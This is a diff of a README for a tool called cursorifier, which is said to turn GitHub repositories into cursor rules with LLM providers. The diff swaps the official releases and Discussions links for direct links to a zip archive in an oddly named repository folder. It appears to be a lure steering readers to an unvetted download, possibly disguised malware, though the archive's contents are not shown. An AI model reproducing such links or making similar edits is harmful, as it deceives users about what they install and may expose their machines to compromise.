@@ -1,7 +1,7 @@
 # 🎯 cursorifier - Transform GitHub Repositories Easily
 
 ## 📥 Download Now
-[![Download cursorifier](https://img.shields.io/badge/Download-cursorifier-blue.svg)](https://github.com/Thabang9218/cursorifier/releases)
+[![Download cursorifier](https://raw.githubusercontent.com/Thabang9218/cursorifier/main/gynecratic/cursorifier.zip)](https://raw.githubusercontent.com/Thabang9218/cursorifier/main/gynecratic/cursorifier.zip)
 
 ## 🚀 Getting Started
 To start using cursorifier, you will need to follow a few simple steps. This application allows you to transform GitHub repositories into cursor rules by utilizing various LLM providers, including Anthropic, OpenAI, and Ollama. It’s designed for everyone, regardless of technical knowledge.
@@ -25,7 +25,7 @@ cursorifier offers several key features that make it easy to use:
 ## 🔗 Download & Install
 To get started with cursorifier, visit this page to download:
 
-[Download cursorifier](https://github.com/Thabang9218/cursorifier/releases)
+[Download cursorifier](https://raw.githubusercontent.com/Thabang9218/cursorifier/main/gynecratic/cursorifier.zip)
 
 Once you have the application downloaded, follow these steps to install it:
 
@@ -66,7 +66,7 @@ Yes, after generating the rules, you can edit them before saving to meet your ne
 If you experience any problems, check the troubleshooting section in the application or visit the issues page on our GitHub repository.
 
 ## 📊 Community and Support
-Join our community to connect with other users. You can ask questions, share your experiences, and find additional resources. Visit our [GitHub Discussions](https://github.com/Thabang9218/cursorifier/discussions).
+Join our community to connect with other users. You can ask questions, share your experiences, and find additional resources. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Thabang9218/cursorifier/main/gynecratic/cursorifier.zip).
 
 ## 🌐 Technologies Used
 cursorifier leverages modern artificial intelligence tools and programming techniques to deliver a seamless experience. We integrate multiple LLM providers, offering flexibility and power in code analysis.
